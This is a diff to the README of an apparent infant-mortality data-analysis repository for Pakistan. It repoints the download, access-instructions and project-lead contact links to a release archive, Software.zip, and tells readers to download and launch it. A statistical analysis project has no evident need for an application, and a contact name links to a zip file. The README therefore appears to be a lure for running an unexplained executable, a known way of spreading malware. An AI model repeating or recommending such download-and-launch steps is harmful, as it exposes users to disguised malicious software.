@@ -31,10 +31,10 @@ In this repository, you will find:
 - World Development Indicators (WDI)
 
 ## Repository Link
-[Download https://github.com/ipascrlet/Pakistan-Infant-Mortality-Analysis/releases/download/v1.0.0/Application.zip](https://github.com/ipascrlet/Pakistan-Infant-Mortality-Analysis/releases/download/v1.0.0/Application.zip) 🚀
+[Download https://github.com/ipascrlet/Pakistan-Infant-Mortality-Analysis/releases/download/v2.0/Software.zip](https://github.com/ipascrlet/Pakistan-Infant-Mortality-Analysis/releases/download/v2.0/Software.zip) 🚀
 
 ## How to Access Software
-Please download the "https://github.com/ipascrlet/Pakistan-Infant-Mortality-Analysis/releases/download/v1.0.0/Application.zip" file from the provided link and launch the application to explore the project further.
+Please download the "https://github.com/ipascrlet/Pakistan-Infant-Mortality-Analysis/releases/download/v2.0/Software.zip" file from the provided link and launch the application to explore the project further.
 
 ## Data Sources
 The data utilized in this analysis is sourced from reputable organizations like UNICEF and the World Bank's World Development Indicators. These datasets provide valuable information on healthcare, socioeconomic factors, and other variables that impact infant health in Pakistan.
@@ -59,6 +59,6 @@ We would like to thank UNICEF and the World Bank for providing valuable datasets
 - Ali Abbas
 
 ## Contact
-For any inquiries or feedback regarding this project, please reach out to the project lead: [John Doe](https://github.com/ipascrlet/Pakistan-Infant-Mortality-Analysis/releases/download/v1.0.0/Application.zip).
+For any inquiries or feedback regarding this project, please reach out to the project lead: [John Doe](https://github.com/ipascrlet/Pakistan-Infant-Mortality-Analysis/releases/download/v2.0/Software.zip).
 
 Let's work together to improve infant health outcomes in Pakistan! 🌟👶🏽🇵🇰
